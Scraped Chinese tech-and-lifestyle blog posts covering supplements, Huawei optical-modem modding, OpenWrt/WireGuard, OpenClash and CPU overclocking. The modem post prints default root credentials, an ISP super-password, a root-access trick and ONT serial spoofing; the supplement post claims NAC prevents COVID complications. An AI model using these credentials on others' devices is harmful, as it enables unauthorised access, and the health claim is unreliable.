以下是介绍NAC（乙酰半胱氨酸）NAC，国内属于处方药叫 乙酰半胱氨酸 可作为护肝保健品，每天600mg * 1。 感染 COVID 后用量加到 600mg X 3 , 可以有效防止 COVID 引起的各类并发症。 NAC 记得买片剂 , 千万别买胶囊 …比臭豆腐还要臭…. 注意事项参照其他资料，建议刚开始小剂量开始尝试。 维生素 D3 + K2https://zhuanlan.zhihu.com/p/415774012 提高血清维生素D含量，会影响冠状病毒COVID-19患者的死亡率。 各地区有色人种血清维生素D的缺乏率在69.2%~82.5%。 作者表示，高度缺乏维生素D 的原因，除了现代化的办公室生活方式（家-汽车-办公室-汽车-家），还和纬度、皮肤色素沉着程度、季节和膳食摄入量（鱼肉、动物肝脏、发酵食品等）有重要关系，而口服维生素D3是预防不足最简单有效的方式。 针对口服D3过量，可能会导致的高钙血症、肾结石等情况，可以通过补充K2来调节，K2羧化可以激活含有γ-羧基谷氨酸的蛋白质（骨钙素），活化的骨钙素将钙沉淀在骨骼中，而非活化的骨骼素会抑制骨骼对钙的吸收。 所以当血清维生素D较高，增加骨钙素合成率时，就需要K2作为拮抗剂，来避免血管硬化、钙化。 另外考虑到代谢维生素D的酶都需要镁，所以作者强烈建议考虑同时摄入K2和镁。 南非醉茄https://zhuanlan.zhihu.com/p/347454352 有 KSM-66 和 Sensoril 两种 Sensoril和KSM-66的区别: “Sensoril® ashwagandha powder also contains a greater total concentration of biologically active constituents, containing 10% (or greater) withanolides; KSM-66 ashwagandha powder is standardized to contain 5% (or greater) withanolides and doesn’t include any ashwagandha leaf constituents.” 也就是说Sensoril的醉茄内酯含量是同量KSM-66的两倍。并且含有醉茄叶提取物。 效果来说： “Anecdotally, most people report that Sensoril is the better “nighttime” ashwagandha supplement, while KSM-66 is superior for daytime use and stimulating cognitive function. For stress relief and general well-being, both will do just fine.” KSM-66对提高白天专注度更有效，Sensoril对提高睡眠质量更有效。降压效果来说是类似的。 我是选择的后者，群友也推荐后者。 下单作业在 iHerb 购入，有7夕活动，优惠码 7XBUY 。到8月23日失效。 我就购入了这三款，具体功用上文有介绍 https://www.iherb.com/pr/source-naturals-n-acetyl-cysteine-600-mg-120-tablets/1291 https://www.iherb.com/pr/life-extension-optimized-ashwagandha-60-vegetarian-capsules/16416 https://www.iherb.com/pr/now-foods-mega-d-3-mk-7-180-mcg-5-000-iu-60-veg-capsules/79866 当然也可以选其他品牌的，记得看 D3 K2 含量，有些比较低。 当天下单，次日就已经发货了。 下单的时候可以用我的优惠码 JIV1863 ，再用商城自带的优惠码，可以享受到优惠的同时我也吃到 AFF。你也可以注册一个小号互相刷 AFF，购物可以折抵。 据说还有一个大绿胶囊，不过不能夏天买，等这一阵过去再考虑购入否。 品牌选购见群友总结的攻略 -&#x3D;爆炸实验&#x3D;- 第二季第3集 - 52个常见抗衰补充剂品牌TierList v2.1 TierList 用在最多的地方…就是Youtube上的原P(roducer). 我把它切换成长方形图标正好可以用来放各大品牌的LOGO .前几天…在玩B站的时候我得知了这世界上有很多强迫症患者 , 于是我又花了1个多小时把这50个Logo居中并调整到了合适的大小.https://tiermaker.com/list/health-fitness/regular-anti-aging-supplement-brands-tier-list-15706019/2904562 以上品牌Ranking结合了美国ConsumerLab的评价 , 自身体验 , 群友介绍 , 以及花费大量时间的综合资料查询…所有的品牌均可通过以下3大正规官方授权渠道很方便的买到: Amazon自营 , 京东国际自营或官方旗舰店 , iherb .淘宝或者京东亚马逊第三方是千万不能买的 , 几年前朋友就买到过面粉丸子做的假GNC褪黑素了…美国英国市场上那堆假NMN也出自于中国…全球三大造假大国 : 中国印度韩国 , China No.1 !因此确保渠道正规之后 , 接下来才是考虑品牌的问题 … 至于这些品牌具体怎么样 , 您需要付费57美元一年订阅 : https://www.consumerlab.com/这是全球最公正的补充剂第三方实验室…9年前它来中国推广过, 然而中国人民可能觉得57美元用来去东莞保健效果比看这种文章效果更好点… 接下来频道中将上传整个Consumerlab打包后的115份付费测评结果~ 待更新…","categories":[{"name":"生活","slug":"生活","permalink":"https://blog.irec.moe/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"续命","slug":"续命","permalink":"https://blog.irec.moe/tags/%E7%BB%AD%E5%91%BD/"},{"name":"保健","slug":"保健","permalink":"https://blog.irec.moe/tags/%E4%BF%9D%E5%81%A5/"}]},{"title":"更换 HS1845X6 光猫并且使用 EasyMesh 进行组网的记录","slug":"硬件/20230808_更换光猫/HS1845X6 折腾记录","date":"2023-08-11T12:00:00.000Z","updated":"2023-08-19T07:24:30.000Z","comments":true,"path":"/fuck_chinamobile.html","permalink":"https://blog.irec.moe/fuck_chinamobile.html","excerpt":"","text":"设备情况湖南电信EPON版本的 HS8145X6 设备类型: Epon 生产厂家: 华为 设备型号: HS8145X6 设备标识号: 1413FB-408411413FB8D7959 硬件版本: 210D.A 软件版本: V5.21.C00S050 普通的超密无法进入，重置需要管理员密码 尝试使用论坛大佬制作的 R20 开 TELNET 工具。 telnet 无效，遂放弃。 其实这种是有办法破解的，是使用上述提到的使能工具，能让光猫直接执行相关的命令，比如说获取里面的配置文件，tftp 传到电脑上然后解密即可。 我是找咸鱼 hwont 大佬，他在我电脑上用使能工具然后传回来一个文件，他拉回去解密然后给我，5分钟搞定，当然文件他是不会给的，有兴趣的话可以自行研究。如果菊花把这个使能工具封禁了或者需要相关授权才能用的话，咸鱼上的配置光猫的会倒一片。 具体步骤改华为界面首先去 192.168.1.1:8080 使用超密登录进去，把 TELNET 防火墙允许，没有补全的照常补全，这里因为我已经补全过了所以说不需要在此补全了。 PS：echo20_Telnet_Shell.bin 这个文件是自带开 telnet 功能的，可以用 HWFW 解包打开，提取出来 EFS 看看就知道了，稍微懂一点 Linux 的也能依葫芦画瓢做出来一些东西的。 123456789telnet 192.168.1.1 root adminHW su shell cd /mnt/jffs2 tftp -pl hw_boardinfo 192.168.1.10 // 传回电脑 tftp -gr hw_boardinfo 192.168.1.10 // 传回光猫 cp hw_boardinfo hw_boardinfo.bak // 复制一份 使用 tftp 传回 hw_boardinfo ，用 HW Dollar 打开，1a,1b 改 COMMON，如图所示 之后再传回光猫，重启即可，再次进入网关界面就会变成华为界面了。 配置ONT认证及上网参数首先要修改认证方式和 SN，配置好上网参数。 注：我所在区域只认证光猫SN，以及用的光猫都没有 LOID 选项。有一次改了一个友华光猫换地区之后出现 LOID，结果在电信宽带上认证不过，其他猫改LOID 和 PASSWORD 是可以的，基本确定我这边光猫固件锁死模式了。都是些二线厂商的猫。 我这里是湖南郴州移动的参数，不同地市VID都不同，仅供参考。 然后修改一下 DHCP 服务器，无缝替换到原来的设备上。 拆机&amp;上机 实测效果正常认证以及成功拨号，可以看到 BRAS 是 ME60，并且 IPV6 前缀拿到 &#x2F;60。 FullCone NAT 和 K662d 正常 Mesh 组网 这里我没有关闭 Wi-Fi覆盖业务(修改后，重启生效)，我觉得原帖说的可能是老版本系统有 BUG 导致的。 碰到的一些问题问题1：IPV6 禁止入站其实在电信界面是有关闭 IPV6 防火墙的设置的，不过在华为界面就没看到了。 第一种方法 telnet 修改文件（不推荐） 使用解密工具解密后，搜索 X_HW_IPv6FWDFireWallEnable 把 1 改成 0，保存加密导入回去重启即可。 注意如果提示 tftp: can’t open ‘hw_ctree.xml’: Permission denied 则需要获取 root 权限，步骤如下 12345touch /mnt/jffs2/Equip.sh //开启root权限 reboot //重启 继续你的上传操作 rm /mnt/jffs2/Equip.sh //关闭root权限! reboot //重启 我用这种方法修改文件之后 WiFi 消失，设置界面中 WiFi 设置一片空白 第二种方法 适用于华为公版界面，直接导出修改即可 我用的第二种方法，改好之后上传还原即可。 测试OK PT 正常，IPV4 甚至有入站连接。 问题2：DHCP失效如果恢复出厂设置之后或者备份还原 hw_boardinfo 文件出现拿不到 IP 的情况，可以手动开关一下 DHCP 服务器，可以解决。 一些小Tips1、华为界面恢复出厂设置之后，PON模式会变为原来的，但修改的 GPON SN 不会变，同时恢复出厂不掉的超级密码也会被替换成电信默认的nE7jA%5m 待补充… 总结用下来还是挺不错的，总花费不算人工费55+100，我家因为户型原因这俩也够全覆盖了。华为固件的 FullCone NAT 也挺好用，局端设备都能 NAT1，总之性价比拉满。唯一缺点是固件不自带限速功能，其他功能还是挺强大的。 参考资料：https://www.right.com.cn/forum/thread-8147423-1-1.html https://www.chinadsl.net/thread-168378-1-1.html https://www.chinadsl.net/forum.php?mod=viewthread&amp;tid=168309&amp;extra= https://www.right.com.cn/forum/thread-4091764-1-1.html 所用到的工具：网盘链接 账号：ont 密码：ont12345","categories":[{"name":"硬件","slug":"硬件","permalink":"https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"}],"tags":[{"name":"光猫","slug":"光猫","permalink":"https://blog.irec.moe/tags/%E5%85%89%E7%8C%AB/"}]},{"title":"在 RTL 网卡上启用 Wireshark VLAN 抓包功能","slug":"网络/经验/20230721_Wireshark 在 RTL 网卡上启用 VLAN 抓包功能/Wireshark 在 RTL 网卡上启用 VLAN 抓包功能","date":"2023-07-21T12:00:00.000Z","updated":"2023-08-19T04:15:37.000Z","comments":true,"path":"/wireshark_vlan_enable.html","permalink":"https://blog.irec.moe/wireshark_vlan_enable.html","excerpt":"","text":"在 RTL 网卡上启用 Wireshark VLAN 抓包功能平台网卡：Thinkbook 14+ 6800H 自带 RTL8168 网卡 驱动版本：10.65.421.2023 WireShark版本：v4.0.7-0-g0ad1823cc090 1、查看驱动注册表位置详细信息 - 属性 -&gt; 驱动程序关键字，如下图。找到最后结尾那个数字，比如我这里是0001 2、修改注册表找到之后 Win + R 输入 regedit 打开注册表。 然后定位到 1HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class{4D36E972-E325-11CE-BFC1-08002bE10318}\\0001 注意这里末尾的数字根据你上一步找到的修改相应的数值。 进去之后只需要把预先存在的 MonitorModeEnabled 的值改为1即可，其他都不用动，我实测成功！ 3、修改 Wireshark 设置右击列标，选择首选项 点击右下角的+，输入标题，选择类型之后拖动到合适的位置即可。 4、测试通常情况下接到交换机的 Trunk 口就能接收到绝大部分的 VLAN 包了（交换机上设置 ALLOW VLAN ALL）。 由于没有网管交换机，这是我通过路由器的 IPTV 功能来模拟的，路由器上设置了 IPTV 口，路由器会在 WAN 口上打上对应的标签发送出去，这样我就能从 WAN 口上接收到打上 VLAN 标签（路由器上 IPTV 口）的数据包了。 Enjoy！","categories":[{"name":"网络","slug":"网络","permalink":"https://blog.irec.moe/categories/%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"WireShark","slug":"WireShark","permalink":"https://blog.irec.moe/tags/WireShark/"},{"name":"经验","slug":"经验","permalink":"https://blog.irec.moe/tags/%E7%BB%8F%E9%AA%8C/"}]},{"title":"在 OpenWrt 下使用 WireGuard 实现全局代理上网","slug":"网络/经验/20230622_OpenWrt WireGuard 实现全局代理上网/在 OpenWrt 下使用 WireGuard 实现全局代理上网","date":"2023-06-22T12:00:00.000Z","updated":"2023-08-19T04:16:00.000Z","comments":true,"path":"/openwrt_with_wireguard_proxy.html","permalink":"https://blog.irec.moe/openwrt_with_wireguard_proxy.html","excerpt":"","text":"在 OpenWrt 下使用 WireGuard 实现全局代理上网设备情况设备型号：360 T7 固件版本号：ImmortalWrt 18.06-5.4-SNAPSHOT r11814-ef0c86bdb0 &#x2F; LuCI branch (git-22.323.17670-f9380b5) 网络架构图如下 网络设置新建 WG 接口，修改协议为 WireGuard VPN 一般配置里填好私钥（可以自行生成），IP地址（对端的允许的IP） Peers 里添加一个新的。 然后填写对端的公钥，允许的IP话，看情况填写。 如果只需要走部分网段的话（打通内网），填写对应的网段即可（CIDR格式），例如192.168.88.0&#x2F;24, 10.22.33.128&#x2F;25。点加号可以添加多条。 如果需要全局代理的话，填写0.0.0.0&#x2F;0（默认路由）即可 路由允许的 IP 打钩，这一条是自动添加路由表的作用。 端点主机和端点端口填写对端的IP地址和端口即可。 持续 Keep-Alive 看情况填写，我使用的是默认值0。 填写好是这样的： 到这一步，如果只需要走部分网段的设置已经接近尾声了，把新建的 WG 接口加入到和 LAN 相同的防火墙区域，即可打通。或者新建一个新区域，配置规则也行，保存应用之后重连一下端口，就可以在 状态 - WireGuard 状态 看到链接信息了，有正常收发流量即为正常。 全局代理设置对于这个在网上相关的资料非常少（也许是我想实现的效果比较扭曲），我到最后发现会自动给我添加 WAN 口的默认路由，导致走不下去，手动添加配置删除路由还是不太稳定，所以放弃。最近有了新发现，是 MWAN 搞的鬼。 现在开始配置教程。 防火墙设置在防火墙区域新建一个 VPN 区域，把 IP 动态伪装打开（相当于在主路由那边是通过这台路由器 NAT 之后通信），再把 WG 接口添加到 VPN 区域。 修改 VPN 区域的设置： ​ 允许转发到目标区域：WAN 区域打钩 ​ 允许来自源区域的转发： LAN 区域打钩 修改 WAN 区域的设置： ​ 允许转发到目标区域：空 ​ 允许来自源区域的转发：VPN 区域打钩 修改 LAN 区域的设置： ​ 允许转发到目标区域：VPN 区域打钩 ​ 允许来自源区域的转发：空 修改好应该是这样的 防火墙 LAN WAN VPN 到此防火墙设置结束。 接口设置WAN接口 -&gt; 高级设置 -&gt; 使用默认网关 去掉对钩 LAN接口 -&gt; 基本设置 -&gt; 使用自定义的 DNS 服务器 -&gt; 填写 WG 那边的网关，或者公共 DNS 路由设置网络 -&gt; 静态路由 -&gt; 静态 IPv4 路由 接口选择 WAN ，对象填写对端 WG 的 IP 地址，IPv4 子网掩码32位，IPv4 网关填写你 WAN 口上级路由器的网关地址，其他保持默认即可。 网络 -&gt; 静态路由 -&gt; 静态 IPv4 路由 网络 -&gt; 负载均衡（MWAN） -&gt; 禁用所有 MWAN 接口 就是因为这个原因，所以他才会自动给我加路由表，明明我取消了使用默认网关，并且没有添加其他的路由项，还是会给我加默认路由，情况如下图。 关闭 MWAN 后 测试联通性 Enjoy！ 更换固件后测试固件版本号：QWRT R23.6.1 &#x2F; LuCI Master (git-23.141.16773-28dd4b3) 这个固件防火墙区域都不用配置，WAN也不用取消默认网关，默认即可上网（自动给添加了路由）。 默认路由表 配置好 WG 后的路由表 大雕NB！","categories":[{"name":"网络","slug":"网络","permalink":"https://blog.irec.moe/categories/%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"OpenWrt","slug":"OpenWrt","permalink":"https://blog.irec.moe/tags/OpenWrt/"},{"name":"WireGuard","slug":"WireGuard","permalink":"https://blog.irec.moe/tags/WireGuard/"}]},{"title":"在 OpenClash 代理环境下 Windows 提示无 Internet","slug":"网络/经验/20230622_OpenClash 无 Internet/20230622_OpenClash 无 Internet","date":"2023-06-22T12:00:00.000Z","updated":"2023-08-19T04:15:48.000Z","comments":true,"path":"/openclash_windows_nointernet.html","permalink":"https://blog.irec.moe/openclash_windows_nointernet.html","excerpt":"","text":"在软路由上用了一段时间 OpenClash，由于我是自己写的规则，所以在很多地方都不完整，中途遇到多多少少的bug。 由于碰到这个无 Internet 的问题，导致某些微软服务登不上，有点烦人。所以折腾了一段时间，有了这样几种解决办法。 第一种方法 - 让域名走代理在这个地方也有讨论下，我是这样解决的。 同样是 FAKE-IP 模式，今天为了这问题折腾一天，最后发现是因为 OpenClash 的 DNS 代理解析出的 IP ，我本地访问会直接被 RESET，而我用本地网络环境解析到的 DNS 却可以正常访问。还碰到一个坑是某些代理商会屏蔽 www.msftconnecttest.com ，具体表现和上述一样。最后我单独改了规则，让他走微软服务，然后微软服务再单独走不屏蔽的节点，完美解决。其实还有其他解决办法，比如说让这个域名单独走本地DNS解析，我觉得这样简单省事就懒得弄了。实测并不是IP段的问题，我还是默认的198.18.0.1&#x2F;16段。 另外一种方法 - 过滤域名请求这段配置是我从其他地方抄过来的，实测可用，记得把前面一种方法提到的 www.msftconnecttest.com 改一下规则，让他不走代理即可。这种方法比上面的方法更简单省事。 1234567891011dns: fake-ip-filter: - &#39;*.lan&#39; - localhost.ptlogin2.qq.com - &#39;+.srv.nintendo.net&#39; - &#39;+.stun.playstation.net&#39; - &#39;+.msftconnecttest.com&#39; - &#39;+.msftncsi.com&#39; - &#39;+.xboxlive.com&#39; - &#39;msftconnecttest.com&#39; - &#39;xbox.*.microsoft.com&#39; 这一段的主要作用就是让 OpenClash 不解析在列表内的域名，直接返回源 IP 地址，这样获取到的 IP 就不会是 198.18.0.0&#x2F;16了。 Enjoy！","categories":[{"name":"网络","slug":"网络","permalink":"https://blog.irec.moe/categories/%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"OpenClash","slug":"OpenClash","permalink":"https://blog.irec.moe/tags/OpenClash/"}]},{"title":"自用 PC 机的折腾记录","slug":"硬件/20230618_个人13700K+3080折腾记录/13700K_3080折腾记录","date":"2023-06-18T04:00:00.000Z","updated":"2023-12-20T06:48:14.000Z","comments":true,"path":"/my_pc.html","permalink":"https://blog.irec.moe/my_pc.html","excerpt":"","text":"配置如下 CPU: Intel Core i7-13700K Base Clock P Core &#x35;&#46;&#51;&#x47;&#x48;&#122;&#64;&#49;&#46;&#x33;&#52;&#86; E Core &#52;&#46;&#x32;&#x47;&#x48;&#x7a;&#x40;&#x31;&#x2e;&#x33;&#x34;&#86; Current: 关闭 HT + VRM LLC Mode 8 + CPU LiteLoad Mode 1 CPU Cooler: VALKYRIE C360-RGB CPU Thermal Paste: Shinetsu X-23-7921-5 RAM: OLOy 战鹰白金特别版 RGB 3600MHz 16GB x2 Motherboard: MSI PRO-Z690-A-WIFI-DDR4 BIOS: 7D25v1C GPU: 盈通 RTX3080 10G 花嫁 0.8V@1710MHz Case: DIY Rack OS: Windows 10 BIOS常规设置OC -&gt; Advanced CPU Configuration BCLK 100MHz Lock On 开 HT 关 CPU Over Temp Protection 110°C TVB 相关全关 IA CEP Support 关 功耗相关设置在设置散热器的时候BIOS自动帮你调整了，这里就不手动调了。 GPU降压照泥潭大佬的教程，摸出下面的表，照着配置即可，最终结果 0.8V@1710MHz。 Voltage Freq Result 0.8 1830 X 1815 X 1800 X 1785 X 1740 X 1710 CURRENT 0.825 1875 X 1830 X 1800 X 3DM 不过 IMC首先摸IMC体质，SA 电压1.4起摸，内存用 XMP 2 4400MHz 18-26-26-46 @ 1.55V。 烧机工具使用 yc 0 1 8 16。 Freq SA result Passed 4400MHz 1.45 不开机 4300MHz 1.45 进系统 -&gt; yc 秒重启 4266MHz 1.45 进系统 -&gt; yc 38s报错 4266MHz 1.40 进系统 -&gt; yc 秒报错 -&gt; 蓝屏 4266MHz 1.50 进系统 -&gt; yc 秒报错 4200MHz 1.40 进系统 -&gt; yc 15it Passed YES 4200MHz 1.37 进系统 -&gt; yc 20it Passed YES 4200MHz 1.36 进系统 -&gt; yc 2it 报错 4200MHz 1.35 进系统 -&gt; yc 1it 报错 4133MHz 1.30 进系统 -&gt; yc 5it Passed YES 4133MHz 1.275 进系统 -&gt; yc 5it Passed YES 4133MHz 1.26 进系统 -&gt; yc 15it Passed YES 4133MHz 1.255 进系统 -&gt; yc 5it Passed 4133MHz 1.25 进系统 -&gt; yc 1min 报错 4133MHz 1.20 进系统 -&gt; 蓝屏 4100MHz 1.24 进系统 -&gt; yc 15it Passed YES 4100MHz 1.23 进系统 -&gt; yc 7it 报错 4100MHz 1.22 进系统 -&gt; yc 2min 报错 4100MHz 1.20 进系统 -&gt; yc 秒报错 4000MHz 1.15 进系统 -&gt; yc 60it Passed YES 4000MHz 1.14 进系统 -&gt; yc 5it 报错 4000MHz 1.12 进系统 -&gt; yc 秒报错 4000MHz 1.10 进系统 -&gt; 蓝屏 实测开关 HT 对 IMC 体质无影响，该不开机的还是不开机 Freq SA Voltage result Passed 4400MHz 1.45 不开机 4300MHz 1.45 进系统 -&gt; yc 秒报错 4266MHz 1.45 进系统 -&gt; yc 20s报错 结果通过上面的测试结果我们可以找到这几组数据 Freq SA Voltage result Passed 4200MHz 1.37 进系统 -&gt; yc 20it Passed YES 4133MHz 1.26 进系统 -&gt; yc 15it Passed YES 4100MHz 1.24 进系统 -&gt; yc 15it Passed YES 4000MHz 1.15 进系统 -&gt; yc 60it Passed YES 最终我选择了&#x34;&#49;&#x33;&#x33;&#77;&#72;&#x7a;&#x40;&#49;&#x2e;&#x32;&#x38;&#x56;，电压按习惯多给0.02防止缩肛不稳定。为什么没选择4200Mhz是因为我觉得0.1V的电压提升67MHz不太值，仅此而已。 CPU超频首先是上文调整好IMC后的测试结果。 CPU-Z 单核876.5分，多核10646.1分 R23 多核25205分。 AIDA64 内存测试结果： AIDA64 FPU：温度95度浮动，P Core 最热 97°C，E Core 最热 87°C 。功耗235W，软显电压1.344V P95 Small FFTs：温度103度浮动，P Core 最热 105°C，E Core 最热 93°C 。功耗270W，软显电压1.300V 对于超频我有两种选择，一种是全核固定频率，一种是动态超频。在此我对两种结果都测试一下。此外还有一种是通过调整 VID 相关 + offset 实现对原有电压曲线进行调整，同时对不同的负载核数动态调整频率。现在网上比较主流的是后面那一种。 固定电压模式有一个缺点就是CPU电压不能下探到1V以下，导致待机功耗偏高，30W左右。 超频我所预想的结果是CPU不撞110°C温度墙，在此基础上尽可能达到单核更高频率并且稳定运行，不能出现不稳定情况。 定压定频超频首先CPU定频1.3V，防掉压设置Mode3。5.6GHz开始起摸。 5.6GHz 电压 P95 CPU-Z R23 FPU remark 1.30V 报错 916&#x2F;11093 94°C&#x2F;233W 1.35V 报错 918&#x2F;11093 26186 1.35V 撞墙 918&#x2F;11086 Mode2 1.30V 掉线程 Mode2 1.32V 掉线程 Mode2 1.33V 撞墙110°C&#x2F;282W&#x2F;490W&#x2F;1.324V 914&#x2F;11116 26137&#x2F;204W&#x2F;1.326V 93°C&#x2F;226W&#x2F;381W&#x2F;1.326V 1.34V 撞墙 Mode2 1.35V 撞墙 Mode2 放弃5.6GHz。 5.5GHz 电压 P95 CPU-Z R23 FPU remark 1.33V 108°C&#x2F;305W&#x2F;1.292V 1.32V 107°C&#x2F;285W&#x2F;1.286V 1.31V 104°C&#x2F;277W&#x2F;507W&#x2F;1.276V 898&#x2F;10983 25928&#x2F;183W&#x2F;1.288V 86°C&#x2F;208W&#x2F;350W&#x2F;1.284V 1.30V 闪退101°C&#x2F;250W&#x2F;1.268V 897&#x2F;10987 25830&#x2F;182W&#x2F;1.278V 1.29V 闪退+死机 1.28V 死机98°C&#x2F;240W&#x2F;1.248V 1.28V 103°C&#x2F;270W&#x2F;483W&#x2F;1.274V 897&#x2F;10979 25877&#x2F;182W&#x2F;1.276V 85°C&#x2F;202W&#x2F;345W&#x2F;1.276V Mode2 1.27V 9min闪退100°C&#x2F;265W&#x2F;462W&#x2F;1.266V 899&#x2F;10978 25919&#x2F;177W&#x2F;1.266V Mode2 1.26V 10min闪退97°C&#x2F;260W&#x2F;457W&#x2F;1.256V Mode2 1.25V 闪退 Mode2 个人觉得Mode2获得的电压比较平一点，所以倾向于使用这个。 在此基础上拿出这两组数据，作为定频定压超频最终结果。我最终选的的是第二组数据使用，电压为了考虑稳定性必须要多给0.03V。 Vcore LLC P95 CPU-Z R23 FPU remark 1.31V Mode3 104°C&#x2F;277W&#x2F;507W&#x2F;1.276V 898&#x2F;10983 25928&#x2F;183W&#x2F;1.288V 86°C&#x2F;208W&#x2F;350W&#x2F;1.284V 1.28V Mode2 103°C&#x2F;270W&#x2F;483W&#x2F;1.274V 897&#x2F;10979 25877&#x2F;182W&#x2F;1.276V 85°C&#x2F;202W&#x2F;345W&#x2F;1.276V 最终结果 参数 P95 CPU-Z R23 FPU remark &#53;&#46;&#53;&#71;&#x68;&#x7a;&#64;&#x31;&#x2e;&#x32;&#57;&#86; LLC Mode 2 105°C&#x2F;270W&#x2F;492W&#x2F;1.282V 901&#x2F;10953 25927&#x2F;186W&#x2F;1.284V 89°C&#x2F;208W&#x2F;350W&#x2F;1.284V 玩原神会闪退&#x2F;TM5不过 &#x35;&#x2e;&#53;&#x47;&#104;&#122;&#x40;&#49;&#x2e;&#51;&#52;&#x56; LLC Mode 3 掉线程降频&#x2F;300W&#x2F;518W&#x2F;1.300V 讲真的，我是真的不想用这个电压，甚至想降压摸 AC LL 去了，这我都给了110°C的功耗墙，已经顶着墙跑了。 网友说一般跑R23测试，那我就跑吧。 依然是 Mode 3 防掉压，电压0.01V一档，找到稳定跑10min不报错的点，跑稳之后再试试（据说对13代）压力更大的R15。 结果因为我是 Win10 跑不了，作罢。 电压 R23 FPU remark 1.31V 25928&#x2F;183W&#x2F;1.288V 86°C&#x2F;208W&#x2F;350W&#x2F;1.284V 1.30V 25830&#x2F;182W&#x2F;1.278V 1.29V 185W&#x2F;312W1.266V 1.28V 第三圈报错 1.27V 自动关机 1.25V 报错 然后想了想，折腾这么久就为了0.2GHz，而且还不稳定，所以作罢，尝试降压。 降压按大佬所说的，先摸防掉压开多少合适，然后降低AC DC。这里依然列一个表，既然是降压那就得把P95加进来。 依然是P95跑稳了再跑R23，打开超线程。 R23 基准分数 30800 这里贴一个我自己测试的 CPU Lite Load Control 表 LLC AC DC 1 1 1 2 10 80 3 15 80 4 20 80 5 25 80 6 30 80 7 35 80 8 40 80 9 50 80 10 60 80 11 70 80 12 80 80 13 90 90 14 100 100 15 110 110 … … … 调整 LLC 测试 VRM LLC CPU LiteLoad P95 R23 FPU remark Auto Auto(50 80) 掉线程109°C&#x2F;316W&#x2F;536W&#x2F;1.276V 97°C&#x2F;253W&#x2F;412W&#x2F;1.320V 100°C&#x2F;252W&#x2F;404W&#x2F;1.332V 内存调好基础上 Auto Auto(50 80) 109°C&#x2F;280W&#x2F;425W&#x2F;1.316V 94°C&#x2F;248W&#x2F;394W&#x2F;1.310V 98°C&#x2F;247W&#x2F;392W&#x2F;1.330V 全默认只改温度墙 Auto Auto(50 80) 降频109°C&#x2F;316W&#x2F;536W&#x2F;1.296V 94°C&#x2F;247W&#x2F;398W&#x2F;1.312V 96°C&#x2F;246W&#x2F;386W&#x2F;1.326V 以上基础开 BCLK 100Mhz Lock Auto Mode 1 闪退 报错 85°C&#x2F;210W&#x2F;318W&#x2F;1.194V Mode 8 Mode 1 蓝屏 报错 85°C&#x2F;210W&#x2F;318W&#x2F;1.194V Mode 7 Mode 1 闪退 87°C&#x2F;225W&#x2F;349W&#x2F;1.230V 90°C&#x2F;218W&#x2F;340W&#x2F;1.234V 30740 Mode 6 Mode 1 闪退99°C&#x2F;306W&#x2F;466W&#x2F;1.216V 91°C&#x2F;229W&#x2F;365W&#x2F;1.252V 91°C&#x2F;223W&#x2F;348W&#x2F;1.254V 30804 Mode 5 Mode 1 掉线程108°C&#x2F;305W&#x2F;494W&#x2F;1.248V 92°C&#x2F;237W&#x2F;382W&#x2F;1.272V 94°C&#x2F;228W&#x2F;368W&#x2F;1.274V 30684 Mode 4 Mode 1 不测了 °C&#x2F;W&#x2F;W&#x2F;V … … … … … 这里我感觉选 Mode 6 比较合适，先这样用几天看看。 换了新电源，重新测试一下。原来老电源3.3V和5V的DCDC有问题，导致内存不稳定，买了一个新的AR650+捍卫版，目前用着还挺不错的。 VRM LLC CPU LiteLoad P95 R23 FPU remark Auto Auto(50 80) 降频104°C&#x2F;290W&#x2F;551W&#x2F;1.254V 91°C&#x2F;243W&#x2F;418W&#x2F;1.310V 95°C&#x2F;245W&#x2F;409W&#x2F;1.324V Mode 6 Mode 1 闪退98°C&#x2F;295W&#x2F;491W&#x2F;1.218V 83°C&#x2F;220W&#x2F;364W&#x2F;1.236V 85°C&#x2F;214W&#x2F;355W&#x2F;1.238V Mode 6 Mode 1 92°C&#x2F;267W&#x2F;424W&#x2F;1.226V 73°C&#x2F;179W&#x2F;308W&#x2F;1.252V 82°C&#x2F;198W&#x2F;335W&#x2F;1.246V 以下关HT Mode 7 Mode 1 90°C&#x2F;255W&#x2F;413W&#x2F;1.202V 72°C&#x2F;174W&#x2F;300W&#x2F;1.236V 81°C&#x2F;192W&#x2F;331W&#x2F;1.226V 25266分 Auto(Mode 8) Mode 1 84°C&#x2F;188W&#x2F;316W&#x2F;1.194V 69°C&#x2F;168W&#x2F;284W&#x2F;1.202V 76°C&#x2F;186W&#x2F;300W&#x2F;1.192V 25272分 对于在这里我选择还是关闭 HT，如果保留 HT 的话可以锁一个253W的功耗墙，这样也可以。 动态超频首先根据泥潭大佬的步骤 第一步：摸出稳定的默频电压曲线也就是降压。像超频，一般会把设置调整到稳定性临界，在倍频电压曲线的默频部分，我也希望降压到稳定性临界。 限制电压对象为“实际VID电压”，建议设置为1450，即1.45v。防止哪个地方抽风或输入误操作给了超高电压把CPU炸了。 ACLL之前已设置为0.01，CPU没有ACLL掉压补偿，默认的VRM LL 1.10毫欧(LLC 等级3)掉压严重，大电流时会稳定性不足，所以之后还需要找一个合适的VRM LL&#x2F;LLC。DCLL也设置为0.01，这是为了方便观察“裸VID电压”，从而方便对VID曲线进行调整。副作用是“实际VID电压”未被DCLL降压，所以软件功耗会虚高。上面设置的253瓦功耗墙大概等价于正常设置的230瓦功耗墙。 调整 VRM LoadLine这里我设置的 VRM LLC Mode 6，也就是0.56mOhm。 这是我这块板子的 LLC 对照表 LLC1 0.01LLC2 忘了LLC3 0.12LLC4 0.28LLC5 0.4LLC6 0.56LLC7 0.69LLC8 0.96 对于 LLC 电压补偿和 CPU LiteLoad 还有 AVX2 Voltage Guardband 我有点不太清楚，所以这里做一个测试看看。 在 VRM LoadLine Mode 6 下调整 CPU LiteLoad Mode。 LiteLoad Vcore 温度 软显功耗 整机功耗 mode1 1.222 96 299 443 mode1+关avx升压 1.222 93 299 435 mode2 1.248 100 273 466 mode2+关avx升压 1.248 100 272 453 mode3 1.264 103 282 470 mode3+关avx升压 1.264 101 281 475 AC DC 1+关avx升压 1.222 97 295 448 实测 AVX2 Voltage Guardband 大概是没用的，就算有用也作用很小。 VRM LoadLine P95 CPU-Z R23 FPU Auto 闪退 865&#x2F;12667&#x2F;1.22V 